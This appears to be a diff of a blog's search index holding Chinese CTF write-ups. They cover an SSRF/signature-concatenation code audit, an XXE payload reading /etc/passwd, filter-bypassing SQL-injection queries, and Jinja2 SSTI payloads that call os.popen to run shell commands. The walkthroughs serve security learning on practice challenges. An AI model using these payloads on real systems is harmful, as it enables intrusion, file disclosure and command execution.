+<p>如果<code>waf(param)</code>函数返回<code>False</code>，则创建一个<code>Task</code>对象，然后执行<code>task.Exec()</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
+<p>会首先检查<code>self.checkSign()</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
+<p>只有满足<code>getSign(self.action, self.param) == self.sign</code>才可以继续执行，这里是一个要解决的点。</p>
+<p>假设我们满足上述情况了，接下来先判断<code>if "scan" in self.action</code>，如果满足，则会执行<code>resp = scan(self.param)</code>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure></p>
+<p>该函数会去访问<code>param</code>并且读取其中得内容并返回。<strong>猜想：利用这个读取flag.txt中得内容</strong>。如果<code>param</code>的确有内容，那么返回到<code>Exec()</code>，然后执行<code>tmpfile.write(resp)</code>，也就是将读取得内容写到<code>./%s/result.txt</code>。</p>
+<p>如果满足<code>if "read" in self.action</code>，则会读取<code>./%s/result.txt</code>中的内容，然后通过<code>result</code>返回。</p>
+<p>最后执行<code>return json.dumps(task.Exec())</code>，将<code>Exec()</code>中的内容以json格式打印出来。</p>
+<p>思路：通过对代码的分析，有了初步思路：</p>
+<ol type="1">
+<li>先将flag.txt中的内容写到<code>./%s/result.txt</code>中，也就是action中得有字符串scan；</li>
+<li>然后读取<code>./%s/result.txt</code>中的内容，成功读取到flag，也就是action中也要有字符串read；</li>
+</ol>
+<p>难题：</p>
+<ul>
+<li>如何满足<code>self.checkSign()</code>，也就是<code>getSign(self.action, self.param) == self.sign</code></li>
+</ul>
+<p>可以利用<code>/geneSign?param=flag.txt</code>，但是这样子得到的是<code>getSign(scan, flag.txt)</code>的值，我们不仅需要<code>scan</code>还需要<code>read</code>。</p>
+<p>注意 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
+<p>分析： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txtread, action=scan</span><br><span class="line">secert_key + param + action = secert_key + flag.txtreadscan</span><br></pre></td></tr></table></figure></p>
+<p>也就是我们先用<code>/geneSign?param=flag.txtread</code>得到<code>secert_key + flag.txtreadscan</code>的MD5值，将其作为<code>sign</code>。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114816.png" /></p>
+<p>然后我们访问<code>/De1ta?param=flag.txt</code>，然后cookie中<code>Cookie: sign=83f8669fd768b006207e62cf66f61904;action=readscan</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114844.png" /></p>
+<p>成功读取flag！</p>
+<p>这是因为此时的<code>sign</code>其实是<code>hashlib.md5(secert_key + flag.txtread + scan).hexdigest()</code>。而执行<code>self.checkSign()</code>时<code>getSign(self.action, self.param) -&gt; hashlib.md5(secert_key + flag.txt + readscan).hexdigest()</code>，自然就满足了<code>getSign(self.action, self.param) == self.sign</code>。并且action中<code>read</code>和<code>scan</code>都有，也就是先将flag.txt内容写入<code>./%s/result.txt</code>，然后在读取该文件中的内容，从而得到了flag。</p>
+<h1 id="总结">总结</h1>
+<p>本题对于SSRF的考察就在于<code>urllib.urlopen(param).read()[:50]</code>，利用这读取flag文件的内容。</p>
+<p>本题主要考察的其实是代码审计的能力！</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>python</tag>
+        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -2732,36 +2732,6 @@
       </tags>
   </entry>
   <entry>
-    <title>NCTF2019 Fake XML cookbook</title>
-    <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，显示如下的登陆界面：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172459.png" /></p>
-<p>由题目可知，本题考察的应该是XXE漏洞。查看了源码之后发现只有一个JavaScript函数，但是没什么作用。因此先随便往表单输入数据看一下效果</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172659.png" /></p>
-<p>发现用户名被原封不动的返回到页面，经过多次测试，确定了无论用户名输入什么都会被返回到界面。结合题目，有理由怀疑这里存在着XXE漏洞。因此，抓取数据包看看</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172854.png" /></p>
-<p>这个提交的表单的就是XML，因此，确定存在XXE漏洞，并且是有回显的。</p>
-<h1 id="解题">解题</h1>
-<p>在POST body中添加这么一句话： <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hdf</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后<code>&lt;username&gt;</code>中的内容改为<code>&amp;xxe;</code>，并提交数据包，发现成功读取文件内容，接下来只需要读取flag就可以了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173147.png" /></p>
-<p>flag一般就在根目录或者网站当前目录，名字为<code>flag</code>。因此一一尝试一下。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173237.png" /></p>
-<p>发现直接就在根目录，成功读取flag。</p>
-<h1 id="总结">总结</h1>
-<p>这是最简单的XXE漏洞利用。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>XXE漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MRCTF2020 PYWebsite</title>
     <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
@@ -2818,6 +2788,36 @@
       </categories>
       <tags>
         <tag>PHP反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NCTF2019 Fake XML cookbook</title>
+    <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，显示如下的登陆界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172459.png" /></p>
+<p>由题目可知，本题考察的应该是XXE漏洞。查看了源码之后发现只有一个JavaScript函数，但是没什么作用。因此先随便往表单输入数据看一下效果</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172659.png" /></p>
+<p>发现用户名被原封不动的返回到页面，经过多次测试，确定了无论用户名输入什么都会被返回到界面。结合题目，有理由怀疑这里存在着XXE漏洞。因此，抓取数据包看看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172854.png" /></p>
+<p>这个提交的表单的就是XML，因此，确定存在XXE漏洞，并且是有回显的。</p>
+<h1 id="解题">解题</h1>
+<p>在POST body中添加这么一句话： <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hdf</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后<code>&lt;username&gt;</code>中的内容改为<code>&amp;xxe;</code>，并提交数据包，发现成功读取文件内容，接下来只需要读取flag就可以了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173147.png" /></p>
+<p>flag一般就在根目录或者网站当前目录，名字为<code>flag</code>。因此一一尝试一下。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173237.png" /></p>
+<p>发现直接就在根目录，成功读取flag。</p>
+<h1 id="总结">总结</h1>
+<p>这是最简单的XXE漏洞利用。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>XXE漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -3185,6 +3185,53 @@
       </tags>
   </entry>
   <entry>
+    <title>SWPU2019 Web1</title>
+    <url>/2022/04/13/SWPU2019%20Web1/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
+<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
+<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
+<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
+<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
+<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
+<h1 id="解题">解题</h1>
+<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
+<ul>
+<li>Bypass information_schema;</li>
+<li>无列名注入</li>
+</ul>
+<p>[[information_schema绕过及无列名注入]]</p>
+<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
+<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
+<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
+<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
+<p>（flag在<code>users</code>中）</p>
+<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
+<p>最终得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>无列名注入</tag>
+        <tag>Bypass information_schema</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Smarty模板注入</title>
     <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
@@ -3241,53 +3288,6 @@
       </categories>
       <tags>
         <tag>Smarty</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SWPU2019 Web1</title>
-    <url>/2022/04/13/SWPU2019%20Web1/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
-<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
-<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
-<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
-<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
-<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
-<h1 id="解题">解题</h1>
-<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
-<ul>
-<li>Bypass information_schema;</li>
-<li>无列名注入</li>
-</ul>
-<p>[[information_schema绕过及无列名注入]]</p>
-<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
-<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
-<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
-<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
-<p>（flag在<code>users</code>中）</p>
-<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
-<p>最终得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>无列名注入</tag>
-        <tag>Bypass information_schema</tag>
       </tags>
   </entry>
   <entry>
@@ -3383,41 +3383,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bugku_SSTI_2</title>
-    <url>/2022/04/05/bugku_SSTI_2/</url>
-    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
-<span id="more"></span>
-<h1 id="题目信息">1 题目信息</h1>
-<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
-<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
-<p>因此判断模板引擎是Jinjia2或者是flask。</p>
-<h1 id="解题">2 解题</h1>
-<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>接下来共有4种方法</p>
-<ul>
-<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
-<li><p>方法2</p></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法3</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Jinjia2</tag>
-        <tag>Flask</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WUSTCTF2020 朴实无华</title>
     <url>/2022/04/07/WUSTCTF2020%20%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D朴实无华">朴实无华</a></p>
@@ -3475,6 +3440,41 @@
       <tags>
         <tag>RCE</tag>
         <tag>PHP之科学计数法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_SSTI_2</title>
+    <url>/2022/04/05/bugku_SSTI_2/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
+<span id="more"></span>
+<h1 id="题目信息">1 题目信息</h1>
+<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
+<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
+<p>因此判断模板引擎是Jinjia2或者是flask。</p>
+<h1 id="解题">2 解题</h1>
+<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来共有4种方法</p>
+<ul>
+<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
+<li><p>方法2</p></li>
+</ul>
